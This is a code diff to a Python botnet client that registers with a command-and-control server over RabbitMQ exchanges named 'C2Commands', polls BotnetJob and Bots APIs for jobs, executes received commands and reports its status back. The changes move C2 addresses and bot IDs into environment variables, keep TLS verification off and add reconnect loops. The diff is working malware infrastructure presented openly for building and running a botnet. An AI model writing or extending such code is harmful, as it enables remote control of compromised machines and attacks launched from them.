@@ -6,6 +6,8 @@ import sys
 import requests
 import urllib3
 import multiprocessing
+import os
+from dotenv import load_dotenv
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -13,18 +15,33 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 class Client():
     def __init__(self):
         self.commands = {1: self.command1, 2: self.command2, 3: self.command3}
-        self.botnet_id = 0
-        self.bot_id = 0
+        load_dotenv()
+        self.botnet_id = os.getenv('BOTNET_ID')
+        self.bot_id = os.getenv('BOT_ID')
+        self.botnetjobs_address = os.getenv('BOTNETJOBS_ADDRESS')
+        self.bots_address = os.getenv('BOTS_ADDRESS')
+        rabbitmq_hostname = os.getenv('RABBITMQ_HOSTNAME')
+        rabbitmq_port = os.getenv('RABBITMQ_PORT')
         self.botnet_job_id = 0
-        self.credentials = pika.PlainCredentials('user', 'user')
-        self.parameters = pika.ConnectionParameters('192.168.0.114', 5672, '/', self.credentials)
+        self.credentials = pika.PlainCredentials('guest', 'guest')
+        self.parameters = pika.ConnectionParameters(rabbitmq_hostname, rabbitmq_port, '/', self.credentials)
         self.connection = pika.BlockingConnection(self.parameters)
         self.job_process = None
 
 
     def init_check_for_jobs(self):
-        url = "https://192.168.0.114:45455/api/v1/BotnetJob/" + str(self.botnet_id)
-        bot_data = requests.get(url=url, verify=False)
+        url = "http://" + self.botnetjobs_address + "/api/v1/BotnetJob/" + str(self.botnet_id)
+        print(url)
+        bot_data = None
+
+        while True:
+            try:
+                bot_data = requests.get(url=url, verify=False)
+                break
+            except:
+                print("[-] No connection to jobs service. Retrying in 10 seconds...")
+                time.sleep(10)
+
         if bot_data.status_code == 200:
             self.execute_command(None, None, None, bot_data.json())
 
@@ -43,7 +60,12 @@ class Client():
 
 
     def listen_for_commands(self):
-        self.init_check_for_jobs()
+        while True:
+            try:
+                self.init_check_for_jobs()
+                break
+            except:
+                print("[-] No connection to jobs service")
         queue_name = "c2commands" + str(self.bot_id)
         exchange_name = "C2Commands" + str(self.botnet_id)
         channel = self.connection.channel()
@@ -55,7 +77,6 @@ class Client():
 
 
     def execute_command(self, ch, method, properties, body):
-
         try:
             body = body.decode()
             body = json.loads(body)
@@ -82,10 +103,10 @@ class Client():
 
     def command_wrapper(command):
         def command_controller(self, command_args):
-            url = "https://192.168.0.114:45456/api/v1/Bots/bot/" + str(self.bot_id)
+            url = "http://" + self.bots_address + "/api/v1/Bots/bot/" + str(self.bot_id)
             bot_data = requests.get(url=url, verify=False).json()
             bot_data['status'] = "Working"
-            url = "https://192.168.0.114:45456/api/v1/Bots/" + str(self.bot_id)
+            url = "http://" + self.bots_address + "/api/v1/Bots/" + str(self.bot_id)
             headers = {'Content-type':'application/json', 'Accept':'application/json'}
             requests.put(url=url, verify=False, json=bot_data, headers=headers)
 
@@ -102,27 +123,14 @@ class Client():
 
 
     def finish_command(self, result):
-        url = "https://192.168.0.114:45455/api/v1/BotnetJob/" + str(self.botnet_job_id)
+        url = "http://" + self.botnetjobs_address + "/api/v1/BotnetJob/" + str(self.botnet_job_id)
         requests.delete(url=url, verify=False)
-        url = "https://192.168.0.114:45456/api/v1/Bots/bot/" + str(self.bot_id)
+        url = "http://" + self.bots_address + "/api/v1/Bots/bot/" + str(self.bot_id)
         bot_data = requests.get(url=url, verify=False).json()
         bot_data['status'] = "Waiting"
-        #TODO: send put to botnetjobs instead
-        url = "https://192.168.0.114:45456/api/v1/Bots/" + str(self.bot_id)
+        url = "http://" + self.bots_address + "/api/v1/Bots/" + str(self.bot_id)
         headers = {'Content-type':'application/json', 'Accept':'application/json'}
         requests.put(url=url, verify=False, json=bot_data, headers=headers)
-
-
-    # TODO: unused function
-    def send_result(self, result):
-        channel = self.connection.channel()
-
-        body = json.dumps({'botId': self.bot_id, 'result': result})
-
-        channel.queue_declare(queue='command_results')
-        channel.basic_publish(exchange='', routing_key='command_results', body=body)
-
-        print("[+] Result sent")
 
 
     @command_wrapper
@@ -158,9 +166,5 @@ class Client():
 
 if __name__ == "__main__":
     client = Client()
-    #(client.botnet_id, client.bot_id) = client.register_bot()
-    client.botnet_id = 1
-    client.bot_id = 1
     client.listen_for_commands()
-
 
